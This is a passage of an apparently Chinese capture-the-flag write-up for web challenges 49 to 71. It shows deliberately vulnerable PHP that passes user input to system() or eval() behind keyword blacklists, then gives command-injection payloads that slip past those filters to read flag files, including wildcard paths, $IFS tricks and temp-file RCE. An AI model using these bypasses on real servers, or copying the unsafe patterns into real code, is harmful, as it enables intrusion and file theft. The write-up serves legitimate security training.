id="21-web49"><a href="#21-web49" class="headerlink" title="21. web49"></a>21. web49</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" &gt;/dev/null 2&gt;&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="22-web50"><a href="#22-web50" class="headerlink" title="22. web50"></a>22. web50</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" &gt;/dev/null 2&gt;&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?c<span class="token operator">=</span>tac<span class="token operator">&lt;&gt;</span><span class="token string">'fla'</span>'g.php<span class="token string">'||?c=tac&lt;'</span>fla<span class="token string">''</span>g.php<span class="token string">'||?c=tac%09'</span>fla<span class="token string">''</span>g.php'<span class="token operator">||</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="23-web51"><a href="#23-web51" class="headerlink" title="23. web51"></a>23. web51</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" &gt;/dev/null 2&gt;&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?c<span class="token operator">=</span>tac<span class="token operator">&lt;&gt;</span><span class="token string">'fla'</span>'g.php<span class="token string">'||?c=tac&lt;'</span>fla<span class="token string">''</span>g.php'<span class="token operator">||</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="24-web52"><a href="#24-web52" class="headerlink" title="24. web52"></a>24. web52</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" &gt;/dev/null 2&gt;&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>放出来了 $IFS</p><p>payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>GET<span class="token punctuation">]</span>?c<span class="token operator">=</span>nl<span class="token environment constant">$IFS</span>/fla<span class="token string">''</span>g<span class="token operator">||</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="25-web53"><a href="#25-web53" class="headerlink" title="25. web53"></a>25. web53</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token operator">.</span><span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?c<span class="token operator">=</span>nl<span class="token variable">${<span class="token environment constant">IFS</span>}</span>fla<span class="token string">''</span>g.php?c<span class="token operator">=</span>c<span class="token string">''</span>at<span class="token variable">${<span class="token environment constant">IFS</span>}</span>fla<span class="token string">''</span>g.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="25-web54"><a href="#25-web54" class="headerlink" title="25. web54"></a>25. web54</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用通配符匹配命令即可</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">?c=rev${IFS}fl?g.php?c=/bin/?at${IFS}f???????<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221024140603.png"></p><h2 id="26-web55"><a href="#26-web55" class="headerlink" title="26. web55"></a>26. web55</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 你们在炫技吗？</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 base64</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?c<span class="token operator">=</span>/???/????64 ????.???           <span class="token comment"># /bin/base64 flag.php</span>?c<span class="token operator">=</span>/???/???/????2 ????.???        <span class="token comment"># /usr/bin/bzip2 flag.php，访问 /flag.php.bz2 下载</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>临时文件 RCE</p><p>rce.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#!/bin/sh</span>ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?c<span class="token operator">=</span>.+/???/????????<span class="token punctuation">[</span>@-<span class="token punctuation">[</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行匹配</p><p><img src="/../../../pic/Pasted%20image%2020221029200729.png"></p><h2 id="27-web56"><a href="#27-web56" class="headerlink" title="27. web56"></a>27. web56</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 你们在炫技吗？</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用临时文件即可</p><p><img src="/../../../pic/Pasted%20image%2020221123081036.png"></p><h2 id="28-web57"><a href="#28-web57" class="headerlink" title="28. web57"></a>28. web57</h2><p>利用  bash 下的运算</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">${_}</span> // 上一次的运算结果<span class="token punctuation">$((</span><span class="token punctuation">))</span> // 对括号内的内容进行计算<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">$((~$(($(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())+~$(())))))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://qiita.com/akinomyoga/items/9761031c551d43307374">https://qiita.com/akinomyoga/items/9761031c551d43307374</a></p><h2 id="29-web58-70"><a href="#29-web58-70" class="headerlink" title="29. web58-70"></a>29. web58-70</h2><p>直接给出源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试执行 <code>phpinfo()</code> 查看禁了哪些函数的时候发现 <code>phpinfo()</code> 也被禁了</p><p>既然要读取 flag 先找一下 flag 在什么位置</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">opendir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token variable">$file</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'glob://./*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-&gt;</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后读取文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">filter_var_array</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">var_export</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"php://filter/convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过 fopen</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">通过fopen去读取文件内容，这里介绍下函数<span class="token function">fread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">fgetss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">fgetcsv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">gpassthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span>payload<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//一行一行读取</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//一个一个字符读取</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgetcsv</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>//通过复制，重命名读取php文件内容（函数执行后，访问url/flag.txt）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">copy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//用法：</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">//过60</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//过60</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="30-web71"><a href="#30-web71" class="headerlink" title="30. web71"></a>30. web71</h2><p>直接给出题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 你们在炫技吗？</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span 